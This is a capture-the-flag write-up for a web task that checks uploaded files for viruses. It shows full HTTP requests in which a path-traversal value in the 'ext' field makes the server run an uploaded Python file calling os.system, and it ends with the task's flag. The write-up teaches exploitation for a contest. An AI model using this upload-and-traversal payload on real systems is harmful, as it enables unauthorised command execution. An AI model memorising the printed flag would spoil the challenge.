we have a website that checks the .exe and .txt files for viruses.
after some attempts, it becomes obvious that the .exe always shows the presence of a virus

![antivirus](https://user-images.githubusercontent.com/76822573/112985023-4f6b7200-9168-11eb-829e-32d40c2fd4c5.png)

first of all, you need to check what is sent in the request to the site. To do this, we will use BurpSuite and drop
our request into a repeater to make it easier to track the logic of the request.

Our request will look like this:

POST /5baeb899e761c5a8/ HTTP/1.1

Host: antivirus.q.2021.ugractf.ru

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------12702853124032821638850309380

Content-Length: 387

Origin: https://antivirus.q.2021.ugractf.ru

Connection: close

Referer: https://antivirus.q.2021.ugractf.ru/5baeb899e761c5a8/

Upgrade-Insecure-Requests: 1



-----------------------------12702853124032821638850309380

Content-Disposition: form-data; name="ext"



.exe
-----------------------------12702853124032821638850309380

Content-Disposition: form-data; name="file"; filename="1.py"

Content-Type: text/x-python



import os



os.system('')


-----------------------------12702853124032821638850309380--


there is an interesting line in the request that is the header for recognition, namely .exe
If we load there not an .exe, but a .py file, then an error is generated on the site with the
location of a special script for starting a check for an .exe file. To solve this, let's try to
change the header in the request from .exe to the place where our file that we download will be located.
We find out that our file, which we send for verification, is stored along the path /tmp/uploads/*file*.py

accordingly, we will change the request to the required one:


POST /5baeb899e761c5a8/ HTTP/1.1

Host: antivirus.q.2021.ugractf.ru

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------12702853124032821638850309380

Content-Length: 387

Origin: https://antivirus.q.2021.ugractf.ru

Connection: close

Referer: https://antivirus.q.2021.ugractf.ru/5baeb899e761c5a8/

Upgrade-Insecure-Requests: 1



-----------------------------12702853124032821638850309380

Content-Disposition: form-data; name="ext"



../../tmp/uploads/1
-----------------------------12702853124032821638850309380

Content-Disposition: form-data; name="file"; filename="1.py"

Content-Type: text/x-python



import os



os.system('ls')


-----------------------------12702853124032821638850309380--



![antivirus_ls](https://user-images.githubusercontent.com/76822573/112986128-c9502b00-9169-11eb-9d51-313595bb3b7f.png)

you can see that our payload worked, we just had to dig into the system and find the flag

![antivirus_ls_etc](https://user-images.githubusercontent.com/76822573/112986252-ef75cb00-9169-11eb-8634-c7ad8877055c.png)


![antivirus_flag](https://user-images.githubusercontent.com/76822573/112986269-f6044280-9169-11eb-8706-b46d0ee5409f.png)

Answer is: ugra_who_checks_the_checker_7dc3c0687ba6
